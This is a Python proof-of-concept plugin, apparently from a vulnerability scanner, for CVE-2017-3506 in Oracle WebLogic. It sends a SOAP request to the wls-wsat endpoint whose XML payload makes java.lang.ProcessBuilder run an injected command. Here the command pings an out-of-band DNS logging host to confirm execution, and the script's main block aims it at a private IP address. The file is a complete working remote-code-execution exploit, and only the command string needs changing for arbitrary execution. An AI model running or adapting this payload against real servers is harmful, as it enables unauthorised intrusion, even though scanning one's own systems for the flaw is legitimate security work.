#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2017-3506
# updated 2019/10/23, by 0xn0ne
#

from typing import Dict, Tuple

try:
    from utils import PLUGIN_TYPE, net_echo, plugin, urlutil
except:
    import pathlib
    import sys

    sys.path.append(pathlib.Path(__file__).parent.parent.__str__())
    from utils import PLUGIN_TYPE, net_echo, plugin, urlutil


class Plugin(plugin.PluginBase):
    def set_info(self):
        return {
            'name': '',
            'catalog': 'CVE-2017-3506',
            'itype': PLUGIN_TYPE.POC,
            'protocols': ['http', 'https'],
            'port': '7001',
        }

    def run(self, url: urlutil.Url) -> Tuple[bool, Dict]:
        echo = net_echo.DnslogOrg()
        echo.start_service()
        r_info = echo.get_random_id()
        cmd = 'ping {}.{}'.format(r_info['random_id'], r_info['netloc'])
        url = url.join('/wls-wsat/CoordinatorPortType')
        print(10001, url, r_info, cmd, len(cmd.split()))
        pl_string = ''
        for index, it in enumerate(cmd.split()):
            pl_string += '<void index="{}"><string>{}</string></void>'.format(index, it)
        data = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="{}">
                {}
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>'''.format(
            len(cmd.split()), pl_string
        )

        headers = {'Content-Type': 'text/xml'}
        err, response = self.cli.r_super(url.string(), 'POST', data=data, headers=headers, timeout=5)
        print(10001, echo.get_results(r_info['random_id']))
        if err:
            return False, err
        return (
            '<faultstring>java.lang.ProcessBuilder' in response.text or "<faultstring>0" in response.text,
            [echo.get_results(r_info['random_id']), response.text],
        )


if __name__ == '__main__':
    import time

    plugin = Plugin()

    # s_time = time.time()
    # print(plugin.do_testing('scanme.nmap.org'))
    # print('total time(s):', time.time() - s_time)

    s_time = time.time()
    print(plugin.do_testing('192.168.245.128'))
    print('total time(s):', time.time() - s_time)
